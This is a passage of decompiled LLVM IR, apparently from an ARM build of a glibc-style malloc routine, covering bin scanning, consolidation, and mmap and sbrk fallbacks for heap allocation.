  %v4_14348.pre-phi = phi i32 [ %.pre203, %dec_label_pc_14260.dec_label_pc_14318_crit_edge ], [ %v4_14268, %dec_label_pc_14318.loopexit ]
  %v1_14318 = add i32 %v0_14318.pre, 1
  store i32 %v1_14318, i32* %r2.global-to-local, align 4
  %v1_1431c = urem i32 %v1_14318, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r0.global-to-local, align 4
  %v6_14328 = shl i32 1, %v1_1431c
  store i32 %v6_14328, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_14330 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_14330, i32* %r3.global-to-local, align 4
  %v3_14334 = udiv i32 %v1_14318, 32
  store i32 %v3_14334, i32* @r5, align 4
  %v4_14338 = mul nuw nsw i32 %v3_14334, 4
  %v5_14338 = add i32 %v4_14330, %v4_14338
  store i32 %v5_14338, i32* %r2.global-to-local, align 4
  %v1_1433c = add i32 %v5_14338, 820
  %v2_1433c = inttoptr i32 %v1_1433c to i32*
  %v3_1433c = load i32, i32* %v2_1433c, align 4
  store i32 %v3_1433c, i32* @r4, align 4
  %v1_14340 = add i32 %v4_14330, 52
  store i32 %v1_14340, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_14348 = add i32 %v1_14340, %v4_14348.pre-phi
  store i32 %v5_14348, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1434c

dec_label_pc_1434c:                               ; preds = %dec_label_pc_143b4, %dec_label_pc_14318
  %v1_14354 = phi i32 [ %v1_14354.pre, %dec_label_pc_143b4 ], [ %v3_1433c, %dec_label_pc_14318 ]
  %v0_14354 = phi i32 [ %v0_1434c.pre, %dec_label_pc_143b4 ], [ %v6_14328, %dec_label_pc_14318 ]
  %v1_1434c = sub i32 1, %v0_14354
  %v2_1434c = icmp ult i32 %v0_14354, 2
  %v1_1434c. = select i1 %v2_1434c, i32 %v1_1434c, i32 0
  store i32 %v1_1434c., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_14354, %v1_14354
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_1434c
  %v5_14358 = or i32 %v1_1434c., 1
  store i32 %v5_14358, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14364.preheader

bb145:                                            ; preds = %dec_label_pc_1434c
  %v2_1435c = icmp eq i32 %v1_1434c., 0
  br i1 %v2_1435c, label %.dec_label_pc_143a0.preheader_crit_edge, label %dec_label_pc_14364.preheader

.dec_label_pc_143a0.preheader_crit_edge:          ; preds = %bb145
  %v0_1439857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_143a0.preheader

dec_label_pc_14364.preheader:                     ; preds = %bb145, %.thread15
  %v0_14364.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14364

dec_label_pc_14364:                               ; preds = %dec_label_pc_14364.preheader, %dec_label_pc_14370
  %v0_14364 = phi i32 [ %v0_14364.pre, %dec_label_pc_14364.preheader ], [ %v1_14364, %dec_label_pc_14370 ]
  %v1_14364 = add i32 %v0_14364, 1
  store i32 %v1_14364, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_14364, 2
  br i1 %tmp211, label %dec_label_pc_14444.loopexit, label %dec_label_pc_14370

dec_label_pc_14370:                               ; preds = %dec_label_pc_14364
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r3.global-to-local, align 4
  %v1_14374 = load i32, i32* @r8, align 4
  %v2_14374 = add i32 %v1_14374, ptrtoint (i32* @global_var_24424.765 to i32)
  %v3_14374 = inttoptr i32 %v2_14374 to i32*
  %v4_14374 = load i32, i32* %v3_14374, align 4
  store i32 %v4_14374, i32* %r2.global-to-local, align 4
  %v4_14378 = mul i32 %v1_14364, 4
  %v5_14378 = add i32 %v4_14374, %v4_14378
  store i32 %v5_14378, i32* %r3.global-to-local, align 4
  %v1_1437c = add i32 %v5_14378, 820
  %v2_1437c = inttoptr i32 %v1_1437c to i32*
  %v3_1437c = load i32, i32* %v2_1437c, align 4
  store i32 %v3_1437c, i32* @r4, align 4
  %v2_14380 = icmp eq i32 %v3_1437c, 0
  br i1 %v2_14380, label %dec_label_pc_14364, label %dec_label_pc_14388

dec_label_pc_14388:                               ; preds = %dec_label_pc_14370
  %v4_14388 = mul i32 %v1_14364, 256
  %v5_14388 = add i32 %v4_14374, %v4_14388
  store i32 %v5_14388, i32* %r3.global-to-local, align 4
  %v1_1438c = add i32 %v5_14388, 44
  store i32 %v1_1438c, i32* %r0.global-to-local, align 4
  %v0_14390 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14390, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_143a0.preheader

dec_label_pc_143a0.preheader:                     ; preds = %.dec_label_pc_143a0.preheader_crit_edge, %dec_label_pc_14388
  %v0_1439857 = phi i32 [ %v1_1438c, %dec_label_pc_14388 ], [ %v0_1439857.pre, %.dec_label_pc_143a0.preheader_crit_edge ]
  %v0_143bc = phi i32 [ %v3_1437c, %dec_label_pc_14388 ], [ %v1_14354, %.dec_label_pc_143a0.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_14390, %dec_label_pc_14388 ], [ %v0_14354, %.dec_label_pc_143a0.preheader_crit_edge ]
  %v2_143a054 = and i32 %ip.promoted, %v0_143bc
  %v4_143a056 = icmp eq i32 %v2_143a054, 0
  br i1 %v4_143a056, label %dec_label_pc_14398, label %dec_label_pc_143a8

dec_label_pc_14398:                               ; preds = %dec_label_pc_143a0.preheader, %dec_label_pc_14398
  %v2_1439c59 = phi i32 [ %v2_1439c, %dec_label_pc_14398 ], [ %ip.promoted, %dec_label_pc_143a0.preheader ]
  %v0_1439858 = phi i32 [ %v1_14398, %dec_label_pc_14398 ], [ %v0_1439857, %dec_label_pc_143a0.preheader ]
  %v1_14398 = add i32 %v0_1439858, 8
  %v2_1439c = mul i32 %v2_1439c59, 2
  %v2_143a0 = and i32 %v2_1439c, %v0_143bc
  %v4_143a0 = icmp eq i32 %v2_143a0, 0
  br i1 %v4_143a0, label %dec_label_pc_14398, label %dec_label_pc_143a0.dec_label_pc_143a8_crit_edge

dec_label_pc_143a0.dec_label_pc_143a8_crit_edge:  ; preds = %dec_label_pc_14398
  store i32 %v1_14398, i32* %r0.global-to-local, align 4
  store i32 %v2_1439c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_143a8

dec_label_pc_143a8:                               ; preds = %dec_label_pc_143a0.dec_label_pc_143a8_crit_edge, %dec_label_pc_143a0.preheader
  %v0_143c8 = phi i32 [ %v2_1439c, %dec_label_pc_143a0.dec_label_pc_143a8_crit_edge ], [ %ip.promoted, %dec_label_pc_143a0.preheader ]
  %v0_143ec = phi i32 [ %v1_14398, %dec_label_pc_143a0.dec_label_pc_143a8_crit_edge ], [ %v0_1439857, %dec_label_pc_143a0.preheader ]
  %v1_143a8 = add i32 %v0_143ec, 12
  %v2_143a8 = inttoptr i32 %v1_143a8 to i32*
  %v3_143a8 = load i32, i32* %v2_143a8, align 4
  store i32 %v3_143a8, i32* @lr, align 4
  %v9_143ac = icmp eq i32 %v3_143a8, %v0_143ec
  br i1 %v9_143ac, label %dec_label_pc_143b4, label %dec_label_pc_143d4

dec_label_pc_143b4:                               ; preds = %dec_label_pc_143a8
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r0.global-to-local, align 4
  %v1_143b8 = load i32, i32* @r8, align 4
  %v2_143b8 = add i32 %v1_143b8, ptrtoint (i32* @global_var_24424.765 to i32)
  %v3_143b8 = inttoptr i32 %v2_143b8 to i32*
  %v4_143b8 = load i32, i32* %v3_143b8, align 4
  %v2_143bc = sub i32 -1, %v0_143c8
  %v3_143bc = and i32 %v0_143bc, %v2_143bc
  store i32 %v3_143bc, i32* @r4, align 4
  %v1_143c0 = load i32, i32* @r5, align 4
  %v4_143c0 = mul i32 %v1_143c0, 4
  %v5_143c0 = add i32 %v4_143c0, %v4_143b8
  store i32 %v5_143c0, i32* %r3.global-to-local, align 4
  %v1_143c4 = add i32 %v0_143ec, 8
  store i32 %v1_143c4, i32* %r0.global-to-local, align 4
  %v2_143c8 = mul i32 %v0_143c8, 2
  store i32 %v2_143c8, i32* %ip.global-to-local, align 4
  %v2_143cc = add i32 %v5_143c0, 820
  %v3_143cc = inttoptr i32 %v2_143cc to i32*
  store i32 %v3_143bc, i32* %v3_143cc, align 4
  %v0_1434c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_14354.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1434c

dec_label_pc_143d4:                               ; preds = %dec_label_pc_143a8
  %v1_143d4 = add i32 %v3_143a8, 4
  %v2_143d4 = inttoptr i32 %v1_143d4 to i32*
  %v3_143d4 = load i32, i32* %v2_143d4, align 4
  store i32 %v3_143d4, i32* %r3.global-to-local, align 4
  %v1_143d8 = and i32 %v3_143d4, -4
  store i32 %v1_143d8, i32* %r2.global-to-local, align 4
  %v0_143dc = load i32, i32* @sl, align 4
  %v2_143dc = sub i32 %v1_143d8, %v0_143dc
  store i32 %v2_143dc, i32* %ip.global-to-local, align 4
  %v1_143e0 = add i32 %v3_143a8, 12
  %v2_143e0 = inttoptr i32 %v1_143e0 to i32*
  %v3_143e0 = load i32, i32* %v2_143e0, align 4
  store i32 %v3_143e0, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_143dc, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_143d4
  %v6_143e8 = add i32 %v1_143d8, %v3_143a8
  store i32 %v6_143e8, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_143d4, %bb146
  %v2_143ec = add i32 %v3_143e0, 8
  %v3_143ec = inttoptr i32 %v2_143ec to i32*
  store i32 %v0_143ec, i32* %v3_143ec, align 4
  %v0_143f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_143f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_143f0 = add i32 %v1_143f0, 12
  %v3_143f0 = inttoptr i32 %v2_143f0 to i32*
  store i32 %v0_143f0, i32* %v3_143f0, align 4
  %v4_143f4 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_142d0_crit_edge, label %dec_label_pc_14400

.dec_label_pc_142d0_crit_edge:                    ; preds = %bb147
  %v5_143f4 = add i32 %v4_143f4, 8
  store i32 %v5_143f4, i32* %r4.global-to-local, align 4
  %v4_143f8 = load i32, i32* %r2.global-to-local, align 4
  %v5_143f8 = add i32 %v4_143f8, 4
  %v6_143f8 = inttoptr i32 %v5_143f8 to i32*
  %v7_143f8 = load i32, i32* %v6_143f8, align 4
  store i32 %v7_143f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_142d0

dec_label_pc_14400:                               ; preds = %bb147
  %v1_14400 = load i32, i32* @sl, align 4
  %v2_14400 = add i32 %v1_14400, %v4_143f4
  store i32 %v2_14400, i32* %r1.global-to-local, align 4
  %v1_14408 = load i32, i32* @r6, align 4
  %v2_14408 = add i32 %v1_14408, 8
  %v3_14408 = inttoptr i32 %v2_14408 to i32*
  store i32 %v2_14400, i32* %v3_14408, align 4
  %v0_1440c = load i32, i32* %r1.global-to-local, align 4
  %v1_1440c = load i32, i32* @r6, align 4
  %v2_1440c = add i32 %v1_1440c, 12
  %v3_1440c = inttoptr i32 %v2_1440c to i32*
  store i32 %v0_1440c, i32* %v3_1440c, align 4
  %v0_14410 = load i32, i32* @r6, align 4
  %v1_14410 = load i32, i32* %r1.global-to-local, align 4
  %v2_14410 = add i32 %v1_14410, 8
  %v3_14410 = inttoptr i32 %v2_14410 to i32*
  store i32 %v0_14410, i32* %v3_14410, align 4
  %v0_14414 = load i32, i32* @r6, align 4
  %v1_14414 = load i32, i32* %r1.global-to-local, align 4
  %v2_14414 = add i32 %v1_14414, 12
  %v3_14414 = inttoptr i32 %v2_14414 to i32*
  store i32 %v0_14414, i32* %v3_14414, align 4
  %tmp213 = icmp ult i32 %v1_14400, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_14400
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  %v8_14420 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v8_14420, i32* %r3.global-to-local, align 4
  %v4_14424 = load i32, i32* %r1.global-to-local, align 4
  %v6_14424 = add i32 %v8_14420, 48
  %v7_14424 = inttoptr i32 %v6_14424 to i32*
  store i32 %v4_14424, i32* %v7_14424, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_14400, %bb148
  %v0_14428 = load i32, i32* @sl, align 4
  %v1_14428 = or i32 %v0_14428, 1
  store i32 %v1_14428, i32* %r2.global-to-local, align 4
  %v0_1442c = load i32, i32* %ip.global-to-local, align 4
  %v1_1442c = or i32 %v0_1442c, 1
  store i32 %v1_1442c, i32* %r3.global-to-local, align 4
  %v0_14430 = load i32, i32* @lr, align 4
  %v1_14430 = add i32 %v0_14430, 8
  store i32 %v1_14430, i32* %r4.global-to-local, align 4
  %v2_14434 = add i32 %v0_14430, 4
  %v3_14434 = inttoptr i32 %v2_14434 to i32*
  store i32 %v1_14428, i32* %v3_14434, align 4
  %v0_14438 = load i32, i32* %ip.global-to-local, align 4
  %v1_14438 = load i32, i32* %r1.global-to-local, align 4
  %v3_14438 = add i32 %v1_14438, %v0_14438
  %v4_14438 = inttoptr i32 %v3_14438 to i32*
  store i32 %v0_14438, i32* %v4_14438, align 4
  %v0_1443c = load i32, i32* %r3.global-to-local, align 4
  %v1_1443c = load i32, i32* %r1.global-to-local, align 4
  %v2_1443c = add i32 %v1_1443c, 4
  %v3_1443c = inttoptr i32 %v2_1443c to i32*
  store i32 %v0_1443c, i32* %v3_1443c, align 4
  br label %dec_label_pc_14898

dec_label_pc_14444.loopexit:                      ; preds = %dec_label_pc_14364
  br label %dec_label_pc_14444

dec_label_pc_14444:                               ; preds = %dec_label_pc_14444.loopexit, %dec_label_pc_14058, %dec_label_pc_14060
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %ip.global-to-local, align 4
  %v4_1444c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_1444c, i32* @r0, align 4
  %v1_14450 = add i32 %v4_1444c, 44
  %v2_14450 = inttoptr i32 %v1_14450 to i32*
  %v3_14450 = load i32, i32* %v2_14450, align 4
  store i32 %v3_14450, i32* %ip.global-to-local, align 4
  %v1_14454 = add i32 %v3_14450, 4
  %v2_14454 = inttoptr i32 %v1_14454 to i32*
  %v3_14454 = load i32, i32* %v2_14454, align 4
  %v0_14458 = load i32, i32* @sl, align 4
  %v1_14458 = add i32 %v0_14458, 16
  store i32 %v1_14458, i32* %r1.global-to-local, align 4
  %v1_1445c = and i32 %v3_14454, -4
  store i32 %v1_1445c, i32* %r3.global-to-local, align 4
  %v3_14460 = icmp ult i32 %v1_1445c, %v1_14458
  br i1 %v3_14460, label %dec_label_pc_14490, label %dec_label_pc_1446c

dec_label_pc_1446c:                               ; preds = %dec_label_pc_14444
  %v2_1446c = sub i32 %v1_1445c, %v0_14458
  %v2_14470 = add i32 %v0_14458, %v3_14450
  store i32 %v2_14470, i32* %r1.global-to-local, align 4
  %v1_14474 = or i32 %v2_1446c, 1
  store i32 %v1_14474, i32* %r3.global-to-local, align 4
  %v1_14478 = or i32 %v0_14458, 1
  store i32 %v1_14478, i32* %r2.global-to-local, align 4
  %v1_1447c = add i32 %v3_14450, 8
  store i32 %v1_1447c, i32* %r4.global-to-local, align 4
  store i32 %v1_14478, i32* %v2_14454, align 4
  %v0_14484 = load i32, i32* %r1.global-to-local, align 4
  %v1_14484 = load i32, i32* @r0, align 4
  %v2_14484 = add i32 %v1_14484, 44
  %v3_14484 = inttoptr i32 %v2_14484 to i32*
  store i32 %v0_14484, i32* %v3_14484, align 4
  %v0_14488 = load i32, i32* %r3.global-to-local, align 4
  %v1_14488 = load i32, i32* %r1.global-to-local, align 4
  %v2_14488 = add i32 %v1_14488, 4
  %v3_14488 = inttoptr i32 %v2_14488 to i32*
  store i32 %v0_14488, i32* %v3_14488, align 4
  br label %dec_label_pc_14898

dec_label_pc_14490:                               ; preds = %dec_label_pc_14444
  %v1_14490 = inttoptr i32 %v4_1444c to i32*
  %v2_14490 = load i32, i32* %v1_14490, align 4
  store i32 %v2_14490, i32* %r3.global-to-local, align 4
  %v1_14494 = and i32 %v2_14490, 2
  store i32 %v1_14494, i32* %ip.global-to-local, align 4
  %v2_14494 = icmp eq i32 %v1_14494, 0
  %v1_14498 = add i32 %v4_1444c, 860
  %v2_14498 = inttoptr i32 %v1_14498 to i32*
  %v3_14498 = load i32, i32* %v2_14498, align 4
  store i32 %v3_14498, i32* %r1.global-to-local, align 4
  br i1 %v2_14494, label %dec_label_pc_144b0, label %dec_label_pc_144a0

dec_label_pc_144a0:                               ; preds = %dec_label_pc_14490
  %v0_144a0 = call i32 @__malloc_consolidate()
  %v0_144a4 = load i32, i32* @sl, align 4
  %v1_144a4 = add i32 %v0_144a4, -7
  store i32 %v1_144a4, i32* @r0, align 4
  %v0_144a8 = call i32 @malloc()
  store i32 %v0_144a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14894

dec_label_pc_144b0:                               ; preds = %dec_label_pc_14490
  %v1_144b0 = add i32 %v4_1444c, 844
  %v2_144b0 = inttoptr i32 %v1_144b0 to i32*
  %v3_144b0 = load i32, i32* %v2_144b0, align 4
  store i32 %v3_144b0, i32* %r3.global-to-local, align 4
  %v3_144b4 = icmp ult i32 %v0_14458, %v3_144b0
  %v1_144b8 = add i32 %v3_14498, -1
  store i32 %v1_144b8, i32* %sb.global-to-local, align 4
  br i1 %v3_144b4, label %dec_label_pc_1458c, label %dec_label_pc_144c0

dec_label_pc_144c0:                               ; preds = %dec_label_pc_144b0
  %v1_144c0 = add i32 %v4_1444c, 852
  %v2_144c0 = inttoptr i32 %v1_144c0 to i32*
  %v3_144c0 = load i32, i32* %v2_144c0, align 4
  store i32 %v3_144c0, i32* %r2.global-to-local, align 4
  %v1_144c4 = add i32 %v4_1444c, 848
  %v2_144c4 = inttoptr i32 %v1_144c4 to i32*
  %v3_144c4 = load i32, i32* %v2_144c4, align 4
  store i32 %v3_144c4, i32* %r3.global-to-local, align 4
  %v6_144cc = icmp slt i32 %v3_144c4, %v3_144c0
  br i1 %v6_144cc, label %dec_label_pc_144d0, label %dec_label_pc_1458c

dec_label_pc_144d0:                               ; preds = %dec_label_pc_144c0
  %v1_144d0 = add i32 %v0_14458, 10
  %v2_144d4 = add i32 %v1_144d0, %v3_14498
  store i32 %v2_144d4, i32* %r3.global-to-local, align 4
  %v2_144d8 = sub i32 0, %v3_14498
  %v3_144d8 = and i32 %v2_144d4, %v2_144d8
  store i32 %v3_144d8, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_144d8, %v0_14458
  br i1 %tmp214, label %dec_label_pc_144e4, label %dec_label_pc_1458c

dec_label_pc_144e4:                               ; preds = %dec_label_pc_144d0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_144d8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_144fc = call i32 @mmap(i32 0, i32 %v3_144d8, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_144fc, i32* %r0.global-to-local, align 4
  %v7_14500 = icmp eq i32 %v6_144fc, -1
  br i1 %v7_14500, label %dec_label_pc_144e4.dec_label_pc_1458c_crit_edge, label %dec_label_pc_14508

dec_label_pc_144e4.dec_label_pc_1458c_crit_edge:  ; preds = %dec_label_pc_144e4
  %v1_145b0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1458c

dec_label_pc_14508:                               ; preds = %dec_label_pc_144e4
  %v1_14508 = urem i32 %v6_144fc, 8
  store i32 %v1_14508, i32* %r2.global-to-local, align 4
  %v2_14508 = icmp eq i32 %v1_14508, 0
  br i1 %v2_14508, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_14508
  %v2_1450c = sub nsw i32 8, %v1_14508
  store i32 %v2_1450c, i32* %r3.global-to-local, align 4
  %v2_14510 = load i32, i32* @r4, align 4
  %v3_14510 = sub i32 %v2_14510, %v2_1450c
  %v3_14514 = add i32 %v2_1450c, %v6_144fc
  store i32 %v3_14514, i32* %lr.global-to-local, align 4
  %v2_1451c = or i32 %v3_14510, 2
  store i32 %v2_1451c, i32* %r2.global-to-local, align 4
  %v5_14524 = inttoptr i32 %v3_14514 to i32*
  store i32 %v2_1450c, i32* %v5_14524, align 4
  %v1_14528 = load i32, i32* %r2.global-to-local, align 4
  %v2_14528 = load i32, i32* %lr.global-to-local, align 4
  %v3_14528 = add i32 %v2_14528, 4
  %v4_14528 = inttoptr i32 %v3_14528 to i32*
  store i32 %v1_14528, i32* %v4_14528, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_14508
  store i32 %v6_144fc, i32* %lr.global-to-local, align 4
  %v1_1452050 = load i32, i32* @r4, align 4
  %v2_1452051 = or i32 %v1_1452050, 2
  store i32 %v2_1452051, i32* %r3.global-to-local, align 4
  %v3_1452c = inttoptr i32 %v6_144fc to i32*
  store i32 0, i32* %v3_1452c, align 4
  %v1_14530 = load i32, i32* %r3.global-to-local, align 4
  %v2_14530 = load i32, i32* %lr.global-to-local, align 4
  %v3_14530 = add i32 %v2_14530, 4
  %v4_14530 = inttoptr i32 %v3_14530 to i32*
  store i32 %v1_14530, i32* %v4_14530, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1453c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_1453c, i32* %ip.global-to-local, align 4
  %v1_14540 = add i32 %v4_1453c, 848
  %v2_14540 = inttoptr i32 %v1_14540 to i32*
  %v3_14540 = load i32, i32* %v2_14540, align 4
  store i32 %v3_14540, i32* %r3.global-to-local, align 4
  %v1_14544 = add i32 %v4_1453c, 856
  %v2_14544 = inttoptr i32 %v1_14544 to i32*
  %v3_14544 = load i32, i32* %v2_14544, align 4
  store i32 %v3_14544, i32* %r2.global-to-local, align 4
  %v1_14548 = add i32 %v3_14540, 1
  store i32 %v1_14548, i32* %r3.global-to-local, align 4
  %v7_14550 = icmp sgt i32 %v1_14548, %v3_14544
  br i1 %v7_14550, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_14548, i32* %v2_14544, align 4
  %v0_14554.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_14554.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_14554 = phi i32 [ %v4_1453c, %.thread30 ], [ %v1_14554.pre, %bb150 ]
  %v0_14554 = phi i32 [ %v1_14548, %.thread30 ], [ %v0_14554.pre, %bb150 ]
  %v2_14554 = add i32 %v1_14554, 848
  %v3_14554 = inttoptr i32 %v2_14554 to i32*
  store i32 %v0_14554, i32* %v3_14554, align 4
  %v0_14558 = load i32, i32* %ip.global-to-local, align 4
  %v1_14558 = add i32 %v0_14558, 868
  %v2_14558 = inttoptr i32 %v1_14558 to i32*
  %v3_14558 = load i32, i32* %v2_14558, align 4
  store i32 %v3_14558, i32* %r3.global-to-local, align 4
  %v1_1455c = add i32 %v0_14558, 880
  %v2_1455c = inttoptr i32 %v1_1455c to i32*
  %v3_1455c = load i32, i32* %v2_1455c, align 4
  store i32 %v3_1455c, i32* %r2.global-to-local, align 4
  %v0_14560 = load i32, i32* @r4, align 4
  %v2_14560 = add i32 %v0_14560, %v3_14558
  store i32 %v2_14560, i32* %r1.global-to-local, align 4
  %v1_14564 = add i32 %v0_14558, 872
  %v2_14564 = inttoptr i32 %v1_14564 to i32*
  %v3_14564 = load i32, i32* %v2_14564, align 4
  store i32 %v3_14564, i32* %r3.global-to-local, align 4
  %v1_1456c = add i32 %v0_14558, 884
  %v2_1456c = inttoptr i32 %v1_1456c to i32*
  %v3_1456c = load i32, i32* %v2_1456c, align 4
  store i32 %v3_1456c, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_14560, %v3_1455c
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_14560, i32* %v2_1455c, align 4
  %v0_14574.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14574.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_14574 = phi i32 [ %v0_14558, %bb151 ], [ %v1_14574.pre, %bb152 ]
  %v0_14574 = phi i32 [ %v2_14560, %bb151 ], [ %v0_14574.pre, %bb152 ]
  %v2_14574 = add i32 %v1_14574, 868
  %v3_14574 = inttoptr i32 %v2_14574 to i32*
  store i32 %v0_14574, i32* %v3_14574, align 4
  %v0_14578 = load i32, i32* %r1.global-to-local, align 4
  %v1_14578 = load i32, i32* %r3.global-to-local, align 4
  %v2_14578 = add i32 %v1_14578, %v0_14578
  store i32 %v2_14578, i32* %r1.global-to-local, align 4
  %v1_1457c = load i32, i32* %r2.global-to-local, align 4
  %v0_14580 = load i32, i32* %lr.global-to-local, align 4
  %v1_14580 = add i32 %v0_14580, 8
  store i32 %v1_14580, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_14578, %v1_1457c
  br i1 %tmp216, label %bb154, label %dec_label_pc_14894

bb154:                                            ; preds = %bb153
  %v5_14584 = load i32, i32* %ip.global-to-local, align 4
  %v6_14584 = add i32 %v5_14584, 884
  %v7_14584 = inttoptr i32 %v6_14584 to i32*
  store i32 %v2_14578, i32* %v7_14584, align 4
  br label %dec_label_pc_14894

dec_label_pc_1458c:                               ; preds = %dec_label_pc_144d0, %dec_label_pc_144b0, %dec_label_pc_144e4.dec_label_pc_1458c_crit_edge, %dec_label_pc_144c0
  %v1_145b0 = phi i32 [ %v1_145b0.pre, %dec_label_pc_144e4.dec_label_pc_1458c_crit_edge ], [ %v0_14458, %dec_label_pc_144c0 ], [ %v0_14458, %dec_label_pc_144b0 ], [ %v0_14458, %dec_label_pc_144d0 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %ip.global-to-local, align 4
  %v4_14594 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_14594, i32* %r3.global-to-local, align 4
  %v1_14598 = add i32 %v4_14594, 44
  %v2_14598 = inttoptr i32 %v1_14598 to i32*
  %v3_14598 = load i32, i32* %v2_14598, align 4
  store i32 %v3_14598, i32* %r0.global-to-local, align 4
  %v1_1459c = add i32 %v4_14594, 864
  %v2_1459c = inttoptr i32 %v1_1459c to i32*
  %v3_1459c = load i32, i32* %v2_1459c, align 4
  store i32 %v3_1459c, i32* %r2.global-to-local, align 4
  %v1_145a0 = add i32 %v4_14594, 840
  %v2_145a0 = inttoptr i32 %v1_145a0 to i32*
  %v3_145a0 = load i32, i32* %v2_145a0, align 4
  store i32 %v3_145a0, i32* %r3.global-to-local, align 4
  %v1_145a4 = add i32 %v3_14598, 4
  %v2_145a4 = inttoptr i32 %v1_145a4 to i32*
  %v3_145a4 = load i32, i32* %v2_145a4, align 4
  store i32 %v3_145a4, i32* %r1.global-to-local, align 4
  %v1_145ac = urem i32 %v3_1459c, 2
  %v2_145ac = icmp eq i32 %v1_145ac, 0
  %v1_145a8 = add i32 %v1_145b0, 16
  %v2_145b0 = add i32 %v1_145a8, %v3_145a0
  store i32 %v2_145b0, i32* %r3.global-to-local, align 4
  %v1_145b4 = and i32 %v3_145a4, -4
  store i32 %v1_145b4, i32* @r8, align 4
  br i1 %v2_145ac, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_1458c
  %v3_145b8 = sub i32 %v2_145b0, %v1_145b4
  store i32 %v3_145b8, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_1458c, %bb155
  %v0_145bc = phi i32 [ %v2_145b0, %dec_label_pc_1458c ], [ %v3_145b8, %bb155 ]
  %v1_145bc = load i32, i32* %sb.global-to-local, align 4
  %v2_145bc = add i32 %v1_145bc, %v0_145bc
  store i32 %v2_145bc, i32* %r3.global-to-local, align 4
  %v1_145c0 = sub i32 -1, %v1_145bc
  store i32 %v1_145c0, i32* %fp.global-to-local, align 4
  %v2_145c4 = and i32 %v2_145bc, %v1_145c0
  store i32 %v2_145c4, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_145c4, 1
  br i1 %tmp157, label %dec_label_pc_145e8, label %dec_label_pc_145d4

dec_label_pc_145d4:                               ; preds = %bb156
  store i32 %v2_145c4, i32* %r0.global-to-local, align 4
  %v1_145d8 = call i32 @__GI_sbrk(i32 %v2_145c4)
  store i32 %v1_145d8, i32* %r0.global-to-local, align 4
  %v3_145dc = icmp eq i32 %v1_145d8, -1
  store i32 %v1_145d8, i32* @r4, align 4
  br i1 %v3_145dc, label %dec_label_pc_145e8, label %dec_label_pc_14654

